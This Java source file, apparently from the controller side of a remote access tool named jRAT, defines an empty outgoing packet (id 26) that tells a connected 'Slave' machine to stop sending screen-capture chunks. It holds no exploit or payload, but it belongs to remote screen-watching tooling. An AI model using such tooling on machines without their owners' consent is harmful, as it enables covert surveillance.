package jrat.module.screen.packets;

import jrat.controller.Slave;
import jrat.controller.packets.outgoing.AbstractOutgoingPacket;

import java.io.DataOutputStream;

/**
 * Sent to indicate that we don't want to receive more screen chunks
 */
public class PacketRemoteScreenStop extends AbstractOutgoingPacket {

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {

	}

	@Override
	public short getPacketId() {
		return 26;
	}

}
